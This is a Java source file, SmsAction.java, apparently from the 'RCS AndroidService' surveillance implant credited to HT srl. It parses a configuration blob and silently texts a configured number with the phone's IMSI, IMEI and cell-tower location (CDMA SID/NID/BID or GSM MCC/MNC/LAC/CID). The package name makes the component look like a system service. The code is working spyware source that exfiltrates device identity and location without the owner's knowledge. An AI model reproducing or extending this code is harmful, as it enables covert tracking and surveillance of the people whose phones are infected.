/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SmsAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import java.io.IOException;

import android.telephony.SmsManager;
import android.util.Log;

import com.android.service.CellInfo;
import com.android.service.Device;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SmsAction.
 */
public class SmsAction extends SubAction {
	private static final String TAG = "SmsAction";
	
	/** The Constant TYPE_LOCATION. */
	private static final int TYPE_LOCATION = 1;
	
	/** The Constant TYPE_SIM. */
	private static final int TYPE_SIM = 2;
	
	/** The Constant TYPE_TEXT. */
	private static final int TYPE_TEXT = 3;
	
	private SmsManager sm;

	/** The number. */
	String number;
	
	/** The text. */
	String text;
	
	/** The type. */
	int type;

	/**
	 * Instantiates a new sms action.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public SmsAction(final SubActionType type, final byte[] confParams) {
		super(type, confParams);
		
		sm = SmsManager.getDefault();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {

		try {
			switch (type) {
			case TYPE_TEXT:
				sendSMS(text);
				return true;
				
			case TYPE_SIM:
				text = "IMSI: " + Device.self().getImsi();
				sendSMS(text);
				return true;

			case TYPE_LOCATION:
				// TODO Implementare il location
				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
				//if (!getGPSPosition()) {
				//	errorLocation();
				//}

				CellInfo c = Device.getCellInfo();
				
				if (c.cdma && c.valid) {
					text = "SID: " + c.sid + ", NID: " + c.nid + ", BID: " + c.bid;
					sendSMS(text);
				}
				
				if (c.gsm && c.valid) {
					text = "CC: " + c.mcc + ", MNC: " + c.mnc + ", LAC: " + c.lac + ", CID: " + c.cid;
					sendSMS(text);
				}
				
				break;
			}
			return true;
		} catch (final Exception ex) {
			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + ex.toString());
			return false;
		}
	}

	/**
	 * Error location.
	 */
	private void errorLocation() {
		if (!getCellPosition()) {
			sendSMS("Cell and GPS info not available");
		}
	}

	/**
	 * Gets the cell position.
	 *
	 * @return the cell position
	 */
	private boolean getCellPosition() {
		// TODO Auto-generated method stub
		return false;
	}

	/**
	 * Gets the gPS position.
	 *
	 * @return the gPS position
	 */
	private boolean getGPSPosition() {
		// TODO Auto-generated method stub
		return false;
	}

	/**
	 * Send sms.
	 *
	 * @param text the text
	 */
	private void sendSMS(final String text) {
		sm.sendTextMessage(number, null, text, null, null);
		
		return;
	}

	/**
	 * Parses the.
	 *
	 * @param confParams the conf params
	 * @return true, if successful
	 */
	protected boolean parse(final byte[] confParams) {
		final DataBuffer databuffer = new DataBuffer(confParams, 0, confParams.length);
		
		try {
			type = databuffer.readInt();
			Check.asserts(type >= 1 && type <= 3, "wrong type");
			int len = databuffer.readInt();
			byte[] buffer = new byte[len];
			databuffer.read(buffer);
			number = Utils.unspace(WChar.getString(buffer, true));

			switch (type) {
				case TYPE_TEXT:
					// TODO controllare che la lunghezza non sia superiore a 70 caratteri
					len = databuffer.readInt();
					buffer = new byte[len];
					databuffer.read(buffer);
					text = WChar.getString(buffer, true);
					break;
					
				case TYPE_LOCATION:
					// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
					break;
					
				case TYPE_SIM:
					final StringBuffer sb = new StringBuffer();
					final Device device = Device.self();
					
					if (Device.isCdma()) {
						// sb.append("SID: " + device.getSid() + "\n");
						// sb.append("ESN: "
						// + NumberUtilities.toString(device.getEsn(), 16)
						// + "\n");
					}
					
					if (Device.isGprs()) {
						sb.append("IMEI: " + device.getImei() + "\n");
						sb.append("IMSI: " + device.getImsi() + "\n");
					}
	
					text = sb.toString();
					break;
					
				default:
					if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: SmsAction.parse,  Unknown type: " + type);
					break;
			}
		} catch (final IOException e) {
			return false;
		}

		return true;
	}

	/* (non-Javadoc)
	 * @see java.lang.Object#toString()
	 */
	@Override
	public String toString() {
		final StringBuffer sb = new StringBuffer();
		
		sb.append("Sms type: " + type);
		sb.append(" number: " + number);
		sb.append(" text: " + text);

		return sb.toString();
	}
}
